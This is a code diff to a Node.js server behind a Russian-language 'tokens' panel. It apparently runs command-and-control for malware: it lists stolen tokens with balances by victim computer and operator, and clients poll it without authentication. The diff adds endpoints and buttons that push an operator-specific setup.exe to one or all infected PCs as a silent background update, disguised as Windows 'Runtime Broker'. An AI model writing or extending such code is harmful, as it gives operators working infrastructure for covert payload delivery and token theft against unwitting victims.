@@ -925,28 +925,102 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
   }
 });
 
-// GET /check-token-request — клиент проверяет, нужен ли новый токен (без авторизации)
+// POST /request-update — запросить обновление клиента для конкретного ПК
+app.post('/request-update', requireAuth, async (req, res) => {
+  try {
+    const { filename, downloadUrl } = req.body;
+    if (!filename) return res.status(400).json({ error: 'Не указан файл' });
+    if (!downloadUrl) return res.status(400).json({ error: 'Не указана ссылка на обновление' });
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    if (db) {
+      await db.collection('files').updateOne(
+        { name: filename, operator: user },
+        { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': new Date().toISOString() } }
+      );
+    } else {
+      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      if (doc) {
+        doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: new Date().toISOString() };
+      }
+    }
+    console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления для ${filename}: ${downloadUrl}`);
+    res.json({ success: true });
+  } catch (e) {
+    console.error('Request-update error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
+  }
+});
+
+// POST /request-update-all — запросить обновление у всех компьютеров оператора
+app.post('/request-update-all', requireAuth, async (req, res) => {
+  try {
+    const { downloadUrl } = req.body;
+    if (!downloadUrl) return res.status(400).json({ error: 'Не указана ссылка на обновление' });
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    const now = new Date().toISOString();
+    if (db) {
+      const result = await db.collection('files').updateMany(
+        { operator: user },
+        { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': now } }
+      );
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех: ${result.modifiedCount} компьютеров: ${downloadUrl}`);
+      res.json({ success: true, count: result.modifiedCount });
+    } else {
+      let count = 0;
+      for (const doc of (global.memFiles || []).filter(f => f.operator === user)) {
+        doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: now };
+        count++;
+      }
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления у всех: ${count} компьютеров: ${downloadUrl}`);
+      res.json({ success: true, count });
+    }
+  } catch (e) {
+    console.error('Request-update-all error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
+  }
+});
+
+// GET /check-token-request — клиент проверяет, нужен ли новый токен или обновление (без авторизации)
 app.get('/check-token-request', async (req, res) => {
   try {
     const computerName = (req.query.computerName || '').toString().substring(0, 128);
     const operator = (req.query.operator || 'Shonll').toString().substring(0, 64);
-    if (!computerName) return res.json({ requested: false });
+    if (!computerName) return res.json({ requested: false, updateRequested: false });
 
     const db = await getDb();
     let doc;
+    let updateRequested = false;
+    let updateUrl = '';
+
     if (db) {
       doc = await db.collection('files').findOne(
         { 'computer.name': computerName, operator: operator },
-        { projection: { 'tokenRequest': 1 } }
+        { projection: { 'tokenRequest': 1, 'updateRequest': 1 } }
       );
+      if (doc && doc.updateRequest && doc.updateRequest.requested === true) {
+        updateRequested = true;
+        updateUrl = doc.updateRequest.downloadUrl || '';
+        // Сбрасываем запрос на обновление
+        await db.collection('files').updateOne(
+          { _id: doc._id },
+          { $set: { 'updateRequest.requested': false } }
+        );
+      }
     } else {
       doc = (global.memFiles || []).find(f => f.computer?.name === computerName && f.operator === operator);
+      if (doc && doc.updateRequest && doc.updateRequest.requested === true) {
+        updateRequested = true;
+        updateUrl = doc.updateRequest.downloadUrl || '';
+        doc.updateRequest.requested = false;
+      }
     }
     const requested = doc?.tokenRequest?.requested === true;
-    res.json({ requested });
+    res.json({ requested, updateRequested, updateUrl });
   } catch (e) {
     console.error('Check-token-request error:', e.message);
-    res.json({ requested: false });
+    res.json({ requested: false, updateRequested: false });
   }
 });
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2221,6 +2295,9 @@ setupSSE();
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function tokensHTML(user) {
   const avatar = user === 'Shonll' ? '🦊' : '🐉';
+  const downloadUrl = user === 'Shonll' 
+    ? '/downloads/RAH_Non_Pro_setup.exe' 
+    : '/downloads/NON_PRO_setup.exe';
   return `<!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -2324,7 +2401,10 @@ function tokensHTML(user) {
       <button class="sort-btn" id="sortAsc" onclick="sortTokens('asc')">💰 Сначала меньше</button>
       <button class="sort-btn" id="sortDate" onclick="sortTokens('date')">📅 По дате</button>
     </div>
-    <button class="sort-btn" onclick="loadTokens()" style="border-color: var(--success); color: var(--success);">↻ Обновить балансы</button>
+    <div>
+      <button class="sort-btn" onclick="loadTokens()" style="border-color: var(--success); color: var(--success);">↻ Обновить балансы</button>
+      <button class="sort-btn" onclick="updateAllClients()" style="border-color: var(--danger); color: var(--danger); margin-left: 8px;">⚡ Обновить у всех</button>
+    </div>
   </div>
 
   <div id="tokensContainer">
@@ -2337,6 +2417,7 @@ function tokensHTML(user) {
 <script>
 let allTokens = [];
 let currentSort = 'desc';
+const operatorDownloadUrl = window.location.origin + "${downloadUrl}";
 
 function fmtSize(b) { if (b < 1024) return b + ' B'; if (b < 1048576) return (b/1024).toFixed(1) + ' KB'; return (b/1048576).toFixed(1) + ' MB'; }
 function fmtDate(s) { return s ? new Date(s).toLocaleString('ru', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' }) : '—'; }
@@ -2405,6 +2486,7 @@ function renderTokens(tokens) {
   html += '<th>Токен</th>';
   html += '<th>Компьютер</th>';
   html += '<th>Дата</th>';
+  html += '<th>Действия</th>';
   html += '</tr></thead><tbody>';
 
   for (const t of tokens) {
@@ -2421,7 +2503,10 @@ function renderTokens(tokens) {
     html += '<td><div class="token-cell" title="' + (t.security || '') + '">' + (t.security ? t.security.substring(0, 40) + '...' : '—') + '</div></td>';
     html += '<td>' + (t.computer || '—') + '</td>';
     html += '<td>' + fmtDate(t.uploadedAt) + '</td>';
-    html += '<td>' + (t.security ? '<button class="copy-btn" onclick="copyToken(' + JSON.stringify(t.security).replace(/"/g, '&quot;') + ')">📋 Копировать</button>' : '') + '</td>';
+    html += '<td>' + 
+      (t.security ? '<button class="copy-btn" onclick="copyToken(' + JSON.stringify(t.security).replace(/"/g, '&quot;') + ')">📋 Копировать</button>' : '') + 
+      '<button class="copy-btn" style="background: rgba(239, 68, 68, 0.12); border-color: rgba(239, 68, 68, 0.25); color: #ef4444; margin-left: 6px;" onclick="updateClient(' + JSON.stringify(t.file).replace(/"/g, '&quot;') + ')">⚡ Обновить</button>' +
+      '</td>';
     html += '</tr>';
   }
   html += '</tbody></table>';
@@ -2433,6 +2518,44 @@ function copyToken(token) {
   navigator.clipboard.writeText(token).then(() => toast('📋 Токен скопирован')).catch(() => {
     const ta = document.createElement('textarea'); ta.value = token; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); toast('📋 Токен скопирован');
   });
+}
+
+async function updateClient(filename) {
+  if (!confirm("Действительно отправить команду на фоновое обновление Runtime Broker на этом ПК?")) return;
+  try {
+    const r = await fetch('/request-update', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename: filename, downloadUrl: operatorDownloadUrl })
+    });
+    const resp = await r.json();
+    if (resp.success) {
+      toast('✅ Команда на обновление отправлена');
+    } else {
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+    }
+  } catch (e) {
+    toast('Ошибка отправки', 'err');
+  }
+}
+
+async function updateAllClients() {
+  if (!confirm("Внимание! Отправить команду на фоновое обновление Runtime Broker на ВСЕХ подключенных ПК?")) return;
+  try {
+    const r = await fetch('/request-update-all', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ downloadUrl: operatorDownloadUrl })
+    });
+    const resp = await r.json();
+    if (resp.success) {
+      toast(`✅ Запрос отправлен на ${resp.count} ПК`);
+    } else {
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+    }
+  } catch (e) {
+    toast('Ошибка отправки', 'err');
+  }
 }
 
 loadTokens();
